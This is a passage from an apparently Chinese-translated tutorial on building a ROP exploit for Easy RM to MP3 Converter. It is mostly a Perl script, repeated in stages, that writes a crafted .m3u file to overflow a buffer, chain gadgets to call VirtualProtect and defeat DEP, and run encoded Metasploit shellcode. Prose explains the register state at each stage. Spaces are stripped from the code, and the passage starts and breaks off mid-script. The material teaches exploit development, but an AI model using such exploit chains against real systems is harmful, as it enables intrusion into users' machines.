"\x74\x45\x38\x44\x32\x50\x6f\x42\x50\x51\x30\x46\x51\x48".
"\x49\x4c\x48\x42\x6c\x47\x54\x44\x58\x4d\x59\x4b\x51\x46".
"\x51\x48\x52\x51\x42\x46\x33\x50\x51\x43\x62\x49\x6f\x4e".
"\x30\x44\x71\x49\x50\x50\x50\x4b\x4f\x50\x55\x45\x58\x45".
"\x5a\x41\x41";
my$rest="C"x300;
my$payload=$junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;
print"Payloadsize:".length($payload)."\n";
print"Shellcodesize:".length($shellcode)."\n";
open($FILE,">$file");
print$FILE$payload;
close($FILE);
print"m3uFile$fileCreatedsuccessfully\n";
让我们在调试器中单步步入然后看addesp，20+ret执行之后发生了什么：
ret返回到0x763C982F（将EDI放入ESI）。
这时，寄存器是这样的：
（EAX和ESI现在指向栈上保存的地址）
这个小配件返回到0x1002DC4C（将会在EAX上加上0x100字节。这会增加EAX的值到
0010F834，指向shellcode之前的nop。
这个小配件返回到0x77E84115（将会执行下面的指令）：
1、它会将EAX（=0x0010F834）写入ESI，+0x10地址处ESI当前包含0x0010F34。在ESI+10
（0x0010F44），我们返回值的占位符：
当mov指令执行时，我们成功地写入我们的返回地址（指向nop），作为VirtualProtect()函数
的参数：
2、ESI的值存入EAX，并且栈中的一些数据存入ESI。
阶段3333：精巧制作第二个参数（llllppppAAAAddddddddrrrreeeessssssss）
第二个参数需要指向标记为可执行的位置。我们将简单地用同样的指针正如第一个参数用
的。
这意味着我们能-或多或少-从阶段2重复整个序列，但是在我们能做这个之前，我们需要重
设我们的起始值。
在当前时候，EAX依然持有初始的保存的栈指针。我们不得不将它放回ESI中。因此我们
不得不找到一个做这样的事的小配件：PUSHEAX，POPESI，RET
然后，我们不得不增加EAX的值（add0x100）。我们又能用同样的小配件作为那个用来产
生参数1的值：0x1002DC4C（ADDEAX，100#POPEBX#RET）
最后，我们不得用4字节增加ESI的值，为了确保它指向下一个参数。我们所需要的是ADD
ESI，4+RET，或者4次的INCESI，RET
我会用
因此，更新过的exploit脚本是这样的：
#------------------------------------------------------------
#ROPbasedexploitforEasyRMtoMP3Converter
#writtenbycorelanc0d3r-http://www.corelan.be:8800
#------------------------------------------------------------
my$file="rop.m3u";
my$buffersize=26094;
my$junk="Z"x$buffersize;
my$eip=pack('V',0x100102DC);#returntostack
my$junk2="AAAA";#compensate
#------PutstackpointerinEDI&EAX------------------------#
my$rop=pack('V',0x5AD79277); #PUSHESP,POPEDI
$rop=$rop.pack('V',0x77C1E842);#PUSHEDI,POPEAX
$rop=$rop."AAAA";#compensateforPOPEBP
#stackpointerisnowinEAX&EDI,nowjumpoverparameters
$rop=$rop.pack('V',0x1001653D); #ADDESP,20
#-------ParametersforVirtualProtect()----------------------#
my$params=pack('V',0x7C801AD4); #VirtualProtect()
$params=$params."WWWW"; #returnaddress(param1)
$params=$params."XXXX"; #lpAddress (param2)
$params=$params."YYYY"; #Size (param3)
$params=$params."ZZZZ"; #flNewProtect (param4)
$params=$params.pack('V',0x10035005); #writeableaddress
$params=$params.("H"x8); #padding
#ADDESP,20+RETwilllandhere
#changeESIsoitpointstocorrectlocation
#towritefirstparameter(returnaddress)
my$rop2=pack('V',0x763C982F); #XCHGESI,EDI#DECECX#RETN4
#-----Makeeaxpointatshellcode--------------------------
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding-compensateforRETN4before
$rop2=$rop2."AAAA";#padding
#----------------------------------------------------------
#returnaddressisinEAX-writeparameter1
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#EAXnowcontainsstackpointer
#saveitbacktoESIfirst
$rop2=$rop2.pack('V',0x775D131E); #PUSHEAX#POPESI#RETN
#-----Makeeaxpointatshellcode(again)--------------------------
$rop2=$rop2.pack('V',0x1002DC4C); #ADDEAX,100#POPEBP
$rop2=$rop2."AAAA";#padding
#increaseESIwith4
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
$rop2=$rop2.pack('V',0x77157D1D); #INCESI#RETN [Module:OLEAUT32.dll]
#andwritelpAddress(param2)
$rop2=$rop2.pack('V',0x77E84115);
$rop2=$rop2."AAAA";#padding
#
my$nops="\x90"x240;
#
#./msfpayloadwindows/messagebox
# TITLE=CORELANTEXT="roptestbycorelanc0d3r"R
#|./msfencode-ex86/alpha_mixed-tperl
my$shellcode=
"\x89\xe0\xda\xcf\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a".
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59".
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41".
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42".
"\x75\x4a\x49\x48\x59\x48\x6b\x4f\x6b\x48\x59\x43\x44\x51".
"\x34\x4c\x34\x50\x31\x48\x52\x4f\x42\x42\x5a\x46\x51\x49".
"\x59\x45\x34\x4e\x6b\x51\x61\x44\x70\x4e\x6b\x43\x46\x46".
"\x6c\x4c\x4b\x42\x56\x45\x4c\x4c\x4b\x42\x66\x43\x38\x4c".
"\x4b\x51\x6e\x45\x70\x4e\x6b\x50\x36\x44\x78\x42\x6f\x45".
"\x48\x44\x35\x4c\x33\x50\x59\x43\x31\x4a\x71\x4b\x4f\x48".
"\x61\x43\x50\x4c\x4b\x50\x6c\x51\x34\x46\x44\x4e\x6b\x47".
"\x35\x45\x6c\x4c\x4b\x42\x74\x43\x35\x42\x58\x46\x61\x48".
"\x6a\x4e\x6b\x51\x5a\x45\x48\x4e\x6b\x42\x7a\x47\x50\x47".
"\x71\x48\x6b\x4a\x43\x45\x67\x42\x69\x4e\x6b\x47\x44\x4e".
"\x6b\x46\x61\x48\x6e\x46\x51\x49\x6f\x45\x61\x49\x50\x49".
"\x6c\x4e\x4c\x4d\x54\x49\x50\x50\x74\x45\x5a\x4b\x71\x48".
"\x4f\x44\x4d\x47\x71\x4b\x77\x48\x69\x48\x71\x49\x6f\x49".
"\x6f\x4b\x4f\x45\x6b\x43\x4c\x47\x54\x44\x68\x51\x65\x49".
"\x4e\x4e\x6b\x50\x5a\x45\x74\x46\x61\x48\x6b\x50\x66\x4e".
"\x6b\x46\x6c\x50\x4b\x4c\x4b\x51\x4a\x45\x4c\x45\x51\x4a".
"\x4b\x4e\x6b\x43\x34\x4c\x4b\x43\x31\x4a\x48\x4d\x59\x42".
"\x64\x51\x34\x47\x6c\x45\x31\x4f\x33\x4f\x42\x47\x78\x44".
"\x69\x49\x44\x4f\x79\x4a\x45\x4e\x69\x4a\x62\x43\x58\x4e".
"\x6e\x42\x6e\x44\x4e\x48\x6c\x43\x62\x4a\x48\x4d\x4c\x4b".
"\x4f\x4b\x4f\x49\x6f\x4d\x59\x42\x65\x43\x34\x4f\x4b\x51".
"\x6e\x48\x58\x48\x62\x43\x43\x4e\x67\x47\x6c\x45\x74\x43".
"\x62\x49\x78\x4e\x6b\x4b\x4f\x4b\x4f\x49\x6f\x4f\x79\x50".
"\x45\x45\x58\x42\x48\x50\x6c\x42\x4c\x51\x30\x4b\x4f\x51".
"\x78\x50\x33\x44\x72\x44\x6e\x51\x74\x50\x68\x42\x55\x50".
"\x73\x42\x45\x42\x52\x4f\x78\x43\x6c\x47\x54\x44\x4a\x4c".
"\x49\x4d\x36\x50\x56\x4b\x4f\x43\x65\x47\x74\x4c\x49\x48".
"\x42\x42\x70\x4f\x4b\x49\x38\x4c\x62\x50\x4d\x4d\x6c\x4e".
"\x67\x45\x4c\x44\x64\x51\x42\x49\x78\x51\x4e\x49\x6f\x4b".
"\x4f\x49\x6f\x42\x48\x42\x6c\x43\x71\x42\x6e\x50\x58\x50".
"\x68\x47\x33\x42\x6f\x50\x52\x43\x75\x45\x61\x4b\x6b\x4e".
"\x68\x51\x4c\x47\x54\x47\x77\x4d\x59\x4b\x53\x50\x68\x51".
"\x48\x47\x50\x51\x30\x51\x30\x42\x48\x50\x30\x51\x74\x50".
"\x33\x50\x72\x45\x38\x42\x4c\x45\x31\x50\x6e\x51\x73\x43".
"\x58\x50\x63\x50\x6f\x43\x42\x50\x65\x42\x48\x47\x50\x43".
"\x52\x43\x49\x51\x30\x51\x78\x43\x44\x42\x45\x51\x63\x50".
"\x74\x45\x38\x44\x32\x50\x6f\x42\x50\x51\x30\x46\x51\x48".
"\x49\x4c\x48\x42\x6c\x47\x54\x44\x58\x4d\x59\x4b\x51\x46".
"\x51\x48\x52\x51\x42\x46\x33\x50\x51\x43\x62\x49\x6f\x4e".
"\x30\x44\x71\x49\x50\x50\x50\x4b\x4f\x50\x55\x45\x58\x45".
"\x5a\x41\x41";
my$rest="C"x300;
my$payload=$junk.$eip.$junk2.$rop.$params.$rop2.$nops.$shellcode.$rest;
print"Payloadsize:".length($payload)."\n";
print"Shellcodesize:".length($shellcode)."\n";
open($FILE,">$file");
print$FILE$payload;
close($FILE);
print"m3uFile$fileCreatedsuccessfully\n";
阶段4444和阶段5555：第三个参数和第四个参数（大小和保护标志）
为了创建第三个参数，我决定设置大小为0x300字节。我们需要做这个的小配件是XOR
EAX，EAX和ADDEAX，100
将结果值作为参数写入的技术和其他参数一样
●保存EAX的值到ESI
●改变EAX（XOREAX，EAX：0x100307A9，然后ADDEAX，100+RET，连续三次：0x1002DC4C）
●将ESI增加4字节
●将EAX写入ESI+0x10处
第四个参数（0x40）用同样的原理：
●保存EAX的值到ESI
●设置EAX为0然后加上40（XOREAX，EAX+RET：0x100307A9/ADDEAX，40+RET：0x1002DC41)
●将ESI增加4字节
●将EAX写入ESI+0x10处
最后阶段：跳到 VirtualProtect
所有的参数现在写入栈中：
我们所需要的是找到一种方法来使ESP指向VirtualProtect()保存的指针的位置（直接跟着那
个函数的参数），然后一某种方式返回。
当前寄存器的状态是：
我做这个的选择是什么？我怎样使ESP指向0010F740然后返回（到VirtualProtect()的指
针））？
回答：EAX已经指向这个地址。因此如果我们能将eax放入esp然后返回，这会很好。
搜索rop.txt寻找一个pusheax/popesp的结合：
这会成功，但是在小配件中有2个POP指令。因此我们不得不首先调节EAX（来弥补POP）。
我们基本上在调节栈前需要首先从eax上减去8。
为了做到这个，我们可以用
我们的最后链是这样的：
●0x775D12F1
●0x775D12F1
●0x73DF5CA8
将所有的东西放在一起，exploit脚本是这样的：
#------------------------------------------------------------
#ROPbasedexploitforEasyRMtoMP3Converter
#writtenbycorelanc0d3r-http://www.corelan.be:8800
#------------------------------------------------------------
my$file="rop.m3u";
my$buffersize=26094;
my$junk="Z"x$buffersize;
my$eip=pack('V',0x100102DC);#returntostack
my$junk2="AAAA";#compensate
#------PutstackpointerinEDI&EAX------------------------#
my$rop=pack('V',0x5AD79277); #PUSHESP,POPEDI
$rop=$rop.pack('V',0x77C1E842);#PUSHEDI,POPEAX
$rop=$rop."AAAA";#compensateforPOPEBP
#stackpointerisnowinEAX&EDI,nowjumpoverparameters
$rop=$rop.pack('V',0x1001653D); #ADDESP,20
#-------ParametersforVirtualProtect()----------------------#
my$params=pack('V',0x7C801AD4); #VirtualProtect()
$params=$params."WWWW"; #returnaddress(param1)